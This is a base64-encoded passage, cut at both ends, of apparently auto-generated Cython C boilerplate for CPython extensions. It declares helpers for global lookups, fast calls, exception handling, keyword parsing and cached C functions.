Jl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlKTtcCn0gd2hpbGUoMCkKI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lVW5jYWNoZWQodmFyLCBuYW1lKSAgZG8ge1wKICAgIFBZX1VJTlQ2NF9UIF9fcHl4X2RpY3RfdmVyc2lvbjtcCiAgICBQeU9iamVjdCAqX19weXhfZGljdF9jYWNoZWRfdmFsdWU7XAogICAgKHZhcikgPSBfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShuYW1lLCAmX19weXhfZGljdF92ZXJzaW9uLCAmX19weXhfZGljdF9jYWNoZWRfdmFsdWUpO1wKfSB3aGlsZSgwKQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKFB5T2JqZWN0ICpuYW1lLCBQWV9VSU5UNjRfVCAqZGljdF92ZXJzaW9uLCBQeU9iamVjdCAqKmRpY3RfY2FjaGVkX3ZhbHVlKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKHZhciwgbmFtZSkgICh2YXIpID0gX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUobmFtZSkKI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lVW5jYWNoZWQodmFyLCBuYW1lKSAgKHZhcikgPSBfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShuYW1lKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUpOwojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnLCBQeU9iamVjdCAqa3cpOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0NhbGwoZnVuYywgYXJnLCBrdykgUHlPYmplY3RfQ2FsbChmdW5jLCBhcmcsIGt3KQojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXAogICAgICAgIGxpa2VseShQeVVuaWNvZGVfQ2hlY2tFeGFjdChzKSkgPyAoUHlfSU5DUkVGKHMpLCBzKSA6XAogICAgICAgIFB5T2JqZWN0X0Zvcm1hdChzLCBmKSkKI2VsaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXAogICAgICAgIGxpa2VseShQeVVuaWNvZGVfQ2hlY2tFeGFjdChzKSkgPyAoUHlfSU5DUkVGKHMpLCBzKSA6XAogICAgICAgIGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChzKSkgPyBQeUxvbmdfVHlwZS50cF9yZXByKHMpIDpcCiAgICAgICAgbGlrZWx5KFB5RmxvYXRfQ2hlY2tFeGFjdChzKSkgPyBQeUZsb2F0X1R5cGUudHBfcmVwcihzKSA6XAogICAgICAgIFB5T2JqZWN0X0Zvcm1hdChzLCBmKSkKI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKHMsIGYpIChcCiAgICAgICAgbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KHMpKSA/IChQeV9JTkNSRUYocyksIHMpIDpcCiAgICAgICAgUHlPYmplY3RfRm9ybWF0KHMsIGYpKQojZW5kaWYKCgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5VW5pY29kZV9Kb2luKFB5T2JqZWN0KiogdmFsdWVzLCBQeV9zc2l6ZV90IHZhbHVlX2NvdW50LCBQeV9zc2l6ZV90IHJlc3VsdF91bGVuZ3RoLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5X1VDUzQgbWF4X2NoYXIpOwoKCiNpZiBDWVRIT05fRkFTVF9QWUNBTEwKI2lmICFDWVRIT05fVkVDVE9SQ0FMTAojZGVmaW5lIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGwoZnVuYywgYXJncywgbmFyZ3MpXAogICAgX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoKGZ1bmMpLCAoYXJncyksIChuYXJncyksIE5VTEwpCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncyk7CiNlbmRpZgojZGVmaW5lIF9fUHl4X0JVSUxEX0FTU0VSVF9FWFBSKGNvbmQpXAogICAgKHNpemVvZihjaGFyIFsxIC0gMiohKGNvbmQpXSkgLSAxKQojaWZuZGVmIFB5X01FTUJFUl9TSVpFCiNkZWZpbmUgUHlfTUVNQkVSX1NJWkUodHlwZSwgbWVtYmVyKSBzaXplb2YoKCh0eXBlICopMCktPm1lbWJlcikKI2VuZGlmCiNpZiAhQ1lUSE9OX1ZFQ1RPUkNBTEwKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDAKICAjaW5jbHVkZSAiZnJhbWVvYmplY3QuaCIKICAjZGVmaW5lIF9fUHh5X1B5RnJhbWVfSW5pdGlhbGl6ZV9PZmZzZXRzKCkKICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfR2V0TG9jYWxzcGx1cyhmcmFtZSkgICgoZnJhbWUpLT5mX2xvY2Fsc3BsdXMpCiNlbHNlCiAgc3RhdGljIHNpemVfdCBfX3B5eF9weWZyYW1lX2xvY2Fsc3BsdXNfb2Zmc2V0ID0gMDsKICAjaW5jbHVkZSAiZnJhbWVvYmplY3QuaCIKICAjZGVmaW5lIF9fUHh5X1B5RnJhbWVfSW5pdGlhbGl6ZV9PZmZzZXRzKClcCiAgICAoKHZvaWQpX19QeXhfQlVJTERfQVNTRVJUX0VYUFIoc2l6ZW9mKFB5RnJhbWVPYmplY3QpID09IG9mZnNldG9mKFB5RnJhbWVPYmplY3QsIGZfbG9jYWxzcGx1cykgKyBQeV9NRU1CRVJfU0laRShQeUZyYW1lT2JqZWN0LCBmX2xvY2Fsc3BsdXMpKSxcCiAgICAgKHZvaWQpKF9fcHl4X3B5ZnJhbWVfbG9jYWxzcGx1c19vZmZzZXQgPSAoKHNpemVfdClQeUZyYW1lX1R5cGUudHBfYmFzaWNzaXplKSAtIFB5X01FTUJFUl9TSVpFKFB5RnJhbWVPYmplY3QsIGZfbG9jYWxzcGx1cykpKQogICNkZWZpbmUgX19QeXhfUHlGcmFtZV9HZXRMb2NhbHNwbHVzKGZyYW1lKVwKICAgIChhc3NlcnQoX19weXhfcHlmcmFtZV9sb2NhbHNwbHVzX29mZnNldCksIChQeU9iamVjdCAqKikoKChjaGFyICopKGZyYW1lKSkgKyBfX3B5eF9weWZyYW1lX2xvY2Fsc3BsdXNfb2Zmc2V0KSkKI2VuZGlmCiNlbmRpZgojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpOwojZW5kaWYKCgojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmMsIGFyZ3MsIG5hcmdzKSAgX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0KGZ1bmMsIGFyZ3MsIChzaXplX3QpKG5hcmdzKSwgTlVMTCkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKiBjb25zdCphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpOwoKCiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QobmFtZSwgYXJncywgbmFyZ3NmKSBQeU9iamVjdF9WZWN0b3JjYWxsTWV0aG9kKG5hbWUsIGFyZ3MsIG5hcmdzZiwgTlVMTCkKI2Vsc2UKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmKTsKI2VuZGlmCgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcihjb25zdCBjaGFyICp2YXJuYW1lKTsKCgojaWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0xpc3RDb21wX0FwcGVuZChQeU9iamVjdCogbGlzdCwgUHlPYmplY3QqIHgpIHsKICAgIFB5TGlzdE9iamVjdCogTCA9IChQeUxpc3RPYmplY3QqKSBsaXN0OwogICAgUHlfc3NpemVfdCBsZW4gPSBQeV9TSVpFKGxpc3QpOwogICAgaWYgKGxpa2VseShMLT5hbGxvY2F0ZWQgPiBsZW4pKSB7CiAgICAgICAgUHlfSU5DUkVGKHgpOwogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgICAgIEwtPm9iX2l0ZW1bbGVuXSA9IHg7CiAgICAgICAgI2Vsc2UKICAgICAgICBQeUxpc3RfU0VUX0lURU0obGlzdCwgbGVuLCB4KTsKICAgICAgICAjZW5kaWYKICAgICAgICBfX1B5eF9TRVRfU0laRShsaXN0LCBsZW4gKyAxKTsKICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIHJldHVybiBQeUxpc3RfQXBwZW5kKGxpc3QsIHgpOwp9CiNlbHNlCiNkZWZpbmUgX19QeXhfTGlzdENvbXBfQXBwZW5kKEwseCkgUHlMaXN0X0FwcGVuZChMLHgpCiNlbmRpZgoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKI2RlZmluZSBfX1B5eF9HZXRFeGNlcHRpb24odHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfX0dldEV4Y2VwdGlvbihfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0YikKc3RhdGljIGludCBfX1B5eF9fR2V0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTsKI2Vsc2UKc3RhdGljIGludCBfX1B5eF9HZXRFeGNlcHRpb24oUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTsKI2VuZGlmCgoKc3RhdGljIHZvaWQgX19QeXhfR2VuZXJhdG9yX1JlcGxhY2VfU3RvcEl0ZXJhdGlvbihpbnQgaW5fYXN5bmNfZ2VuKTsKCgojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUob2JqKVwKICAgIChsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3Qob2JqKSkgPyBfX1B5eF9OZXdSZWYob2JqKSA6IFB5T2JqZWN0X1N0cihvYmopKQoKCkNZVEhPTl9VTlVTRUQgc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdfQ2hlY2soUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbik7CiNpZiBDWVRIT05fVkVDVE9SQ0FMTAojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMAojZGVmaW5lIF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlciBQeU9iamVjdF9WZWN0b3JjYWxsCiNlbHNlCiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyIF9QeU9iamVjdF9WZWN0b3JjYWxsCiNlbmRpZgojZGVmaW5lIF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMobikgUHlUdXBsZV9OZXcobikKc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbik7CnN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKGNvbnN0IGNoYXIgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbik7CiNlbHNlCiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdAojZGVmaW5lIF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMobikgX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKG4pCiNkZWZpbmUgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKGtleSwgdmFsdWUsIGJ1aWxkZXIsIGFyZ3MsIG4pIFB5RGljdF9TZXRJdGVtKGJ1aWxkZXIsIGtleSwgdmFsdWUpCiNkZWZpbmUgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKGtleSwgdmFsdWUsIGJ1aWxkZXIsIGFyZ3MsIG4pIFB5RGljdF9TZXRJdGVtU3RyaW5nKGJ1aWxkZXIsIGtleSwgdmFsdWUpCiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShQeU9iamVjdCAqb2JqKTsKCgojZGVmaW5lIF9fUHl4X0dldEl0ZW1JbnQobywgaSwgdHlwZSwgaXNfc2lnbmVkLCB0b19weV9mdW5jLCBpc19saXN0LCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaywgaGFzX2dpbClcCiAgICAoX19QeXhfZml0c19QeV9zc2l6ZV90KGksIHR5cGUsIGlzX3NpZ25lZCkgP1wKICAgIF9fUHl4X0dldEl0ZW1JbnRfRmFzdChvLCAoUHlfc3NpemVfdClpLCBpc19saXN0LCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaykgOlwKICAgIChpc19saXN0ID8gKFB5RXJyX1NldFN0cmluZyhQeUV4Y19JbmRleEVycm9yLCAibGlzdCBpbmRleCBvdXQgb2YgcmFuZ2UiKSwgKFB5T2JqZWN0KilOVUxMKSA6XAogICAgICAgICAgICAgICBfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMobywgdG9fcHlfZnVuYyhpKSkpKQojZGVmaW5lIF9fUHl4X0dldEl0ZW1JbnRfTGlzdChvLCBpLCB0eXBlLCBpc19zaWduZWQsIHRvX3B5X2Z1bmMsIGlzX2xpc3QsIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrLCBoYXNfZ2lsKVwKICAgIChfX1B5eF9maXRzX1B5X3NzaXplX3QoaSwgdHlwZSwgaXNfc2lnbmVkKSA/XAogICAgX19QeXhfR2V0SXRlbUludF9MaXN0X0Zhc3QobywgKFB5X3NzaXplX3QpaSwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2spIDpcCiAgICAoUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0luZGV4RXJyb3IsICJsaXN0IGluZGV4IG91dCBvZiByYW5nZSIpLCAoUHlPYmplY3QqKU5VTEwpKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9MaXN0X0Zhc3QoUHlPYmplY3QgKm8sIFB5X3NzaXplX3QgaSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgd3JhcGFyb3VuZCwgaW50IGJvdW5kc2NoZWNrKTsKI2RlZmluZSBfX1B5eF9HZXRJdGVtSW50X1R1cGxlKG8sIGksIHR5cGUsIGlzX3NpZ25lZCwgdG9fcHlfZnVuYywgaXNfbGlzdCwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2ssIGhhc19naWwpXAogICAgKF9fUHl4X2ZpdHNfUHlfc3NpemVfdChpLCB0eXBlLCBpc19zaWduZWQpID9cCiAgICBfX1B5eF9HZXRJdGVtSW50X1R1cGxlX0Zhc3QobywgKFB5X3NzaXplX3QpaSwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2spIDpcCiAgICAoUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0luZGV4RXJyb3IsICJ0dXBsZSBpbmRleCBvdXQgb2YgcmFuZ2UiKSwgKFB5T2JqZWN0KilOVUxMKSkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfVHVwbGVfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2spOwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhQeU9iamVjdCAqbywgUHlPYmplY3QqIGopOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGlzX2xpc3QsIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2spOwoKCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlEaWN0X0dldEl0ZW0oUHlPYmplY3QgKmQsIFB5T2JqZWN0KiBrZXkpOwojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShvYmosIG5hbWUpXAogICAgKGxpa2VseShQeURpY3RfQ2hlY2tFeGFjdChvYmopKSA/XAogICAgIF9fUHl4X1B5RGljdF9HZXRJdGVtKG9iaiwgbmFtZSkgOiBQeU9iamVjdF9HZXRJdGVtKG9iaiwgbmFtZSkpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW0oZCwga2V5KSBQeU9iamVjdF9HZXRJdGVtKGQsIGtleSkKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0ob2JqLCBuYW1lKSAgUHlPYmplY3RfR2V0SXRlbShvYmosIG5hbWUpCiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbE5vRXJyb3Iob2JqLCBhdHRyX25hbWUpICBfX1B5eF9fUHlPYmplY3RfTG9va3VwU3BlY2lhbChvYmosIGF0dHJfbmFtZSwgMCkKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG9iaiwgYXR0cl9uYW1lKSAgX19QeXhfX1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwob2JqLCBhdHRyX25hbWUsIDEpCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9fUHlPYmplY3RfTG9va3VwU3BlY2lhbChQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lLCBpbnQgd2l0aF9lcnJvcik7CiNlbHNlCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbE5vRXJyb3IobyxuKSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihvLG4pCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChvLG4pIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIobyxuKQojZW5kaWYKCgojaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAmJiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKc3RhdGljIF9QeUVycl9TdGFja0l0ZW0gKiBfX1B5eF9QeUVycl9HZXRUb3Btb3N0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSk7CiNlbmRpZgoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25TYXZlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X19FeGNlcHRpb25TYXZlKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25TYXZlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTsKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25SZXNldCh0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblJlc2V0KFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25TYXZlKHR5cGUsIHZhbHVlLCB0YikgICBQeUVycl9HZXRFeGNJbmZvKHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25SZXNldCh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9TZXRFeGNJbmZvKHR5cGUsIHZhbHVlLCB0YikKI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQojZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblN3YXAodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfX0V4Y2VwdGlvblN3YXAoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblN3YXAoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpOwojZWxzZQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0V4Y2VwdGlvblN3YXAoUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTsKI2VuZGlmCgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGNvbnN0IGNoYXIqIGZ1bmNfbmFtZSwgUHlPYmplY3QqIGt3X25hbWUpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QYXJzZUtleXdvcmRzKAogICAgUHlPYmplY3QgKmt3ZHMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMsIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqa3dkczIsIFB5T2JqZWN0ICp2YWx1ZXNbXSwKICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLCBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLAogICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncwopOwoKCiNkZWZpbmUgX19QeXhfQ2FsbENGdW5jdGlvbihjZnVuYywgc2VsZiwgYXJncylcCiAgICAoKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShjZnVuYyktPmZ1bmMpKHNlbGYsIGFyZ3MpCiNkZWZpbmUgX19QeXhfQ2FsbENGdW5jdGlvbldpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywga3dhcmdzKVwKICAgICgoUHlDRnVuY3Rpb25XaXRoS2V5d29yZHMpKHZvaWQoKikodm9pZCkpKGNmdW5jKS0+ZnVuYykoc2VsZiwgYXJncywga3dhcmdzKQojZGVmaW5lIF9fUHl4X0NhbGxDRnVuY3Rpb25GYXN0KGNmdW5jLCBzZWxmLCBhcmdzLCBuYXJncylcCiAgICAoKF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCkodm9pZCgqKSh2b2lkKSkoUHlDRnVuY3Rpb24pKGNmdW5jKS0+ZnVuYykoc2VsZiwgYXJncywgbmFyZ3MpCiNkZWZpbmUgX19QeXhfQ2FsbENGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMoY2Z1bmMsIHNlbGYsIGFyZ3MsIG5hcmdzLCBrd25hbWVzKVwKICAgICgoX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzKSh2b2lkKCopKHZvaWQpKShQeUNGdW5jdGlvbikoY2Z1bmMpLT5mdW5jKShzZWxmLCBhcmdzLCBuYXJncywga3duYW1lcykKCgp0eXBlZGVmIHN0cnVjdCB7CiAgICBQeU9iamVjdCAqdHlwZTsKICAgIFB5T2JqZWN0ICoqbWV0aG9kX25hbWU7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAmJiBDWVRIT05fQVRPTUlDUwogICAgX19weXhfYXRvbWljX2ludF90eXBlIGluaXRpYWxpemVkOwojZW5kaWYKICAgIFB5Q0Z1bmN0aW9uIGZ1bmM7CiAgICBQeU9iamVjdCAqbWV0aG9kOwogICAgaW50IGZsYWc7Cn0gX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uICpjZnVuYykgewojaWYgIUNZVEhPTl9BVE9NSUNTCiAgICByZXR1cm4gMTsKI2Vsc2UKICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBleHBlY3RlZCA9IDA7CiAgICBpZiAoX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoJmNmdW5jLT5pbml0aWFsaXplZCwgJmV4cGVjdGVkLCAxKSkgewogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmV0dXJuIGV4cGVjdGVkOwojZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9TZXRGaW5pc2hlZEluaXRpYWxpemluZyhfX1B5eF9DYWNoZWRDRnVuY3Rpb24gKmNmdW5jKSB7CiNpZiBDWVRIT05fQVRPTUlDUwogICAgX19weXhfYXRvbWljX3N0b3JlKCZjZnVuYy0+aW5pdGlhbGl6ZWQsIDIpOwojZW5kaWYKfQojZWxzZQojZGVmaW5lIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoY2Z1bmMpIDIKI2RlZmluZSBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fU2V0RmluaXNoZWRJbml0aWFsaXppbmcoY2Z1bmMpCiNlbmRpZgoKCkNZVEhPTl9VTlVTRUQKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIGNmdW5jLCBQeU9iamVjdCogc2VsZiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfQ2FsbFVuYm91bmRDTWV0aG9kMihfX1B5eF9DYWNoZWRDRnVuY3Rpb24gKmNmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFy